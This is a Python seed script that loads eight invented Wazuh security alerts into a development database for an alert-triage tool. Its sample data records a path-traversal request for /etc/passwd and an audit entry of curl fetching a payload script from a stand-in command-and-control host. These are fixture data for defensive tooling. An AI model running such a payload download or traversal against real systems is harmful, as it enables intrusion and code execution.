#!/usr/bin/env python3
"""Seed the database with realistic sample Wazuh alerts for local development."""

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from backend.app.db.session import async_session_factory
from backend.app.integrations.wazuh.normalizer import (
    extract_alert_fields,
    normalize_wazuh_alert,
)
from backend.app.models.alert import Alert, AlertStatus

SAMPLE_ALERTS = [
    {
        "id": "sample-001",
        "timestamp": "2026-04-06T14:22:01.000+0000",
        "rule": {
            "id": "5710",
            "level": 5,
            "description": "sshd: Attempt to login using a denied user.",
            "groups": ["syslog", "sshd", "authentication_failed"],
            "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]},
        },
        "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.11"},
        "data": {"srcip": "203.0.113.42", "srcport": "44231", "dstuser": "root"},
        "location": "/var/log/auth.log",
        "full_log": "Apr  6 14:22:01 target-1 sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 44231 ssh2",
    },
    {
        "id": "sample-002",
        "timestamp": "2026-04-06T14:25:33.000+0000",
        "rule": {
            "id": "5712",
            "level": 10,
            "description": "sshd: brute force trying to get access to the system. Authentication failed.",
            "groups": ["syslog", "sshd", "authentication_failures"],
            "mitre": {"id": ["T1110.001"], "tactic": ["Credential Access"]},
        },
        "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.11"},
        "data": {"srcip": "203.0.113.42", "srcport": "44298", "dstuser": "admin"},
        "location": "/var/log/auth.log",
        "full_log": "Apr  6 14:25:33 target-1 sshd[12389]: Failed password for invalid user admin from 203.0.113.42 port 44298 ssh2",
    },
    {
        "id": "sample-003",
        "timestamp": "2026-04-06T15:01:17.000+0000",
        "rule": {
            "id": "550",
            "level": 7,
            "description": "Integrity checksum changed.",
            "groups": ["ossec", "syscheck", "syscheck_entry_modified"],
            "mitre": {"id": ["T1565.001"], "tactic": ["Impact"]},
        },
        "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.12"},
        "data": {
            "path": "/etc/passwd",
            "mode": "realtime",
            "changed_attributes": ["content", "mtime"],
            "old_attrs": {"md5": "a1b2c3d4e5f6", "mtime": "2026-04-01T10:00:00"},
            "new_attrs": {"md5": "f6e5d4c3b2a1", "mtime": "2026-04-06T15:01:15"},
        },
        "location": "syscheck",
        "full_log": "File '/etc/passwd' modified. MD5 changed from a1b2c3d4e5f6 to f6e5d4c3b2a1",
    },
    {
        "id": "sample-004",
        "timestamp": "2026-04-06T16:45:02.000+0000",
        "rule": {
            "id": "5402",
            "level": 3,
            "description": "Successful sudo to ROOT executed.",
            "groups": ["syslog", "sudo"],
            "mitre": {"id": ["T1548.003"], "tactic": ["Privilege Escalation"]},
        },
        "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.11"},
        "data": {"srcuser": "developer", "dstuser": "root", "command": "/bin/bash"},
        "location": "/var/log/auth.log",
        "full_log": "Apr  6 16:45:02 target-1 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash",
    },
    {
        "id": "sample-005",
        "timestamp": "2026-04-06T17:12:45.000+0000",
        "rule": {
            "id": "31104",
            "level": 6,
            "description": "Web server 400 error code.",
            "groups": ["web", "accesslog", "web_scan"],
            "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]},
        },
        "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.12"},
        "data": {
            "srcip": "198.51.100.77",
            "url": "/admin/../../etc/passwd",
            "httpmethod": "GET",
            "response_code": "400",
        },
        "location": "/var/log/nginx/access.log",
        "full_log": '198.51.100.77 - - [06/Apr/2026:17:12:45 +0000] "GET /admin/../../etc/passwd HTTP/1.1" 400 150',
    },
    {
        "id": "sample-006",
        "timestamp": "2026-04-06T18:30:11.000+0000",
        "rule": {
            "id": "510",
            "level": 7,
            "description": "Host-based anomaly detection event (rootcheck).",
            "groups": ["ossec", "rootcheck"],
            "mitre": {"id": ["T1014"], "tactic": ["Defense Evasion"]},
        },
        "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.11"},
        "data": {
            "title": "Trojaned version of file detected.",
            "file": "/usr/bin/ls",
        },
        "location": "rootcheck",
        "full_log": "Trojaned version of file '/usr/bin/ls' detected. Possible rootkit activity.",
    },
    {
        "id": "sample-007",
        "timestamp": "2026-04-06T19:05:22.000+0000",
        "rule": {
            "id": "5715",
            "level": 6,
            "description": "sshd: authentication success after several failed attempts.",
            "groups": ["syslog", "sshd", "authentication_success"],
            "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]},
        },
        "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.12"},
        "data": {"srcip": "203.0.113.42", "srcport": "55012", "dstuser": "webadmin"},
        "location": "/var/log/auth.log",
        "full_log": "Apr  6 19:05:22 target-2 sshd[13001]: Accepted password for webadmin from 203.0.113.42 port 55012 ssh2",
    },
    {
        "id": "sample-008",
        "timestamp": "2026-04-06T20:15:00.000+0000",
        "rule": {
            "id": "80790",
            "level": 3,
            "description": "Audit: Command executed.",
            "groups": ["audit", "audit_command"],
            "mitre": {"id": ["T1059"], "tactic": ["Execution"]},
        },
        "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.11"},
        "data": {
            "audit": {
                "exe": "/usr/bin/curl",
                "command": "curl",
                "args": "http://malicious-c2.example.com/payload.sh",
                "success": "yes",
                "uid": "1000",
                "euid": "0",
            }
        },
        "location": "audit",
        "full_log": 'type=EXECVE msg=audit(1712435700.000:1234): argc=2 a0="curl" a1="http://malicious-c2.example.com/payload.sh"',
    },
]


async def seed():
    async with async_session_factory() as session:
        from sqlalchemy import select

        count = 0
        for raw in SAMPLE_ALERTS:
            existing = await session.execute(
                select(Alert).where(Alert.wazuh_id == raw["id"])
            )
            if existing.scalar_one_or_none() is not None:
                continue

            normalized = normalize_wazuh_alert(raw)
            fields = extract_alert_fields(raw)

            alert = Alert(
                wazuh_id=raw["id"],
                raw_data=raw,
                normalized_data=normalized,
                severity=fields["severity"],
                rule_id=fields["rule_id"],
                rule_description=fields["rule_description"],
                agent_name=fields["agent_name"],
                status=AlertStatus.PENDING,
            )
            session.add(alert)
            count += 1

        await session.commit()
        print(f"Seeded {count} new alerts ({len(SAMPLE_ALERTS) - count} already existed).")


if __name__ == "__main__":
    asyncio.run(seed())
